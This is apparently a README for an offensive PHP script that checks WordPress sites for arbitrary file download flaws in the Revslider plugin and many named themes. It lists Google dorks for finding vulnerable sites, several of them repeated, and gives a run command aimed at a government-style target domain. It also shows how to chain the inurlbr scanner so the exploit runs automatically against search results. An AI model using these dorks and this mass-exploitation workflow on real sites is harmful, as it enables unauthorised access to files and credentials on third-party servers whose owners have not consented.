- Wordpress A.F.D Verification / INURL - BRASIL
------
>Check Arbitrary File Download the CMS Wordpress

```
 NAME:                 Wordpress A.F.D Verification/ INURL - BRASIL
 TIPE:                 Arbitrary File Download
 Tested on:            Linux 
 EXECUTE:              php exploit.php www.target.gov.us
 OUTPUT:               WORDPRES_A_F_D.txt
 AUTOR:                Cleiton Pinheiro / NICK: GoogleINURL
 Blog:                 http://blog.inurl.com.br
 Twitter:              https://twitter.com/googleinurl
 Fanpage:              https://fb.com/InurlBrasil
 PASTEBIN:             http://pastebin.com/u/googleinurl
 GIT:                  https://github.com/googleinurl
 YOUTUBE               https://www.youtube.com/channel/UCFP-WEzs5Ikdqw0HBLImGGA
 PACKETSTORMSECURITY:: http://packetstormsecurity.com/user/googleinurl/
```

- Themes affected and Dorks search
------
```
 WordPress revslide Arbitrary File Download
 Google Dork:: inurl:revslider_show_image -intext:revslider_show_image
 ------------------------------------------------------------------------------
 
 WordPress Ultimatum Theme Arbitrary File Download
 Vendor Homepage:: http://ultimatumtheme.com/ultimatum-themes/s
 Google Dork:: "Index of" & /wp-content/themes/ultimatum
 ------------------------------------------------------------------------------
 
 WordPress Medicate Theme Arbitrary File Download
 Vendor Homepage:: http://themeforest.net/item/medicate-responsive-medical-and-health-theme/3707916
 Google Dork:: "Index of" & /wp-content/themes/medicate/
 ------------------------------------------------------------------------------
 
 WordPress Centum Theme Arbitrary File Download
 Vendor Homepage:: http://themeforest.net/item/centum-responsive-wordpress-theme/3216603
 Google Dork:: "Index of" & /wp-content/themes/Centum/
 ------------------------------------------------------------------------------
 
 WordPress Avada Theme Arbitrary File Download
 Vendor Homepage:: http://themeforest.net/item/avada-responsive-multipurpose-theme/2833226
 Google Dork:: "Index of" & /wp-content/themes/Avada/
 ------------------------------------------------------------------------------
 
 WordPress Striking Theme & E-Commerce Arbitrary File Download
 Vendor Homepage:: http://themeforest.net/item/striking-multiflex-ecommerce-responsive-wp-theme/128763
 Google Dork:: "Index of" & /wp-content/themes/striking_r/
 ------------------------------------------------------------------------------
 
 WordPress Beach Apollo Arbitrary File Download
 Vendor Homepage:: https://www.authenticthemes.com/theme/apollo/
 Google Dork:: "Index of" & /wp-content/themes/beach_apollo/
 ------------------------------------------------------------------------------

 WordPress index of ajax-store-locator 
 Google Dork:: inurl:ajax-store-locator
 Vendor Homepage:: http://codecanyon.net/item/ajax-store-locator-wordpress/5293356
 ------------------------------------------------------------------------------
 
 WordPress cuckootap Theme Arbitrary File Download
 Google Dork:: "Index of" & /wp-content/themes/cuckootap/
 Vendor Homepage:: http://www.cuckoothemes.com/
 ------------------------------------------------------------------------------ 
 
 WordPress IncredibleWP Theme Arbitrary File Download
 Vendor Homepage:: http://freelancewp.com/wordpress-theme/incredible-wp/
 Google Dork:: "Index of" & /wp-content/themes/IncredibleWP/
 ------------------------------------------------------------------------------ 
 
 WordPress Ultimatum Theme Arbitrary File Download
 Vendor Homepage:: http://ultimatumtheme.com/ultimatum-themes/s
 Google Dork:: "Index of" & /wp-content/themes/ultimatum
 ------------------------------------------------------------------------------ 
 
 WordPress Medicate Theme Arbitrary File Download
 Vendor Homepage:: http://themeforest.net/item/medicate-responsive-medical-and-health-theme/3707916
 Google Dork:: "Index of" & /wp-content/themes/medicate/
 ------------------------------------------------------------------------------ 
 
 WordPress Centum Theme Arbitrary File Download
 Vendor Homepage:: http://themeforest.net/item/centum-responsive-wordpress-theme/3216603
 Google Dork:: "Index of" & /wp-content/themes/Centum/
 ------------------------------------------------------------------------------ 
 
 WordPress Avada Theme Arbitrary File Download
 Vendor Homepage:: http://themeforest.net/item/avada-responsive-multipurpose-theme/2833226
 Google Dork:: "Index of" & /wp-content/themes/Avada/
 ------------------------------------------------------------------------------
  
 WordPress Striking Theme & E-Commerce Arbitrary File Download
 Vendor Homepage:: http://themeforest.net/item/striking-multiflex-ecommerce-responsive-wp-theme/128763
 Google Dork:: "Index of" & /wp-content/themes/striking_r/
 ------------------------------------------------------------------------------ 
 
 WordPress Beach Apollo Arbitrary File Download
 Vendor Homepage:: https://www.authenticthemes.com/theme/apollo/
 Google Dork:: "Index of" & /wp-content/themes/beach_apollo/
 ------------------------------------------------------------------------------
 
 WordPress Trinity Theme Arbitrary File Download
 Vendor Homepage:: https://churchthemes.net/themes/trinity/
 Google Dork:: "Index of" & /wp-content/themes/trinity/
 ------------------------------------------------------------------------------
 
 WordPress Lote27 Theme Arbitrary File Download
 Google Dork:: "Index of" & /wp-content/themes/lote27/
 ------------------------------------------------------------------------------
 
 WordPress Revslider Theme Arbitrary File Download
 Vendor Homepage:: http://themeforest.net/item/cuckootap-one-page-parallax-wp-theme-plus-eshop/3512405
 Google Dork:: wp-admin & inurl:revslider_show_image
 ------------------------------------------------------------------------------
```
 
 - Dependencies:
------
```
sudo apt-get install php5 php5-cli php5-curl
```

 - Execute:
------
```
    php {script} {target}
Ex: php wordpress-A.F.D-Verification.php www.target.gov.us
```

 - Use complementing inurlbr scanner:
------
```
Ex: ./inurlbr.php --dork 'inurl:revslider_show_image -intext:revslider_show_image' -s '01.txt' -q 1,6 --comand-all 'php xpl.php _TARGET_'
```
More details about inurlbr scanner: https://github.com/googleinurl/SCANNER-INURLBR
